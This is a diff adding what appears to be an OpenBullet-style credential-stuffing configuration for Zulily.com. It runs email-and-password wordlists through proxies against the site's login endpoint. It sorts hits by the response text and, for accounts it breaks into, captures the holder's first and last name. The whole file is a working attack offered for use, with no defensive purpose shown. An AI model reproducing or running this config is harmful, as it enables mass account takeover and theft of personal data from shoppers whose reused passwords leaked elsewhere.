@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Zulily.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-15T15:43:44.2036457+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.zulily.com/auth" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "name=\"authToken\" value=\"" "\">" -> VAR "TK" 
+
+REQUEST POST "https://www.zulily.com/auth" 
+  CONTENT "authToken=<TK>&login%5Busername%5D=<USER>&login%5Bpassword%5D=<PASS>&login%5Bgdpr_consent_state%5D=false&redirectUrl=https%253A%252F%252Fwww.zulily.com%252F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 209" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password." 
+    KEY "Try again or reset password." 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+
+REQUEST GET "https://www.zulily.com/account/edit?rel=top_flyout" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#First_Name PARSE "<SOURCE>" CSS "[name=first_name]" "value" CreateEmpty=FALSE -> CAP "First Name" 
+
+#Last_Name PARSE "<SOURCE>" CSS "[name=last_name]" "value" CreateEmpty=FALSE -> CAP "Last Name" 
+
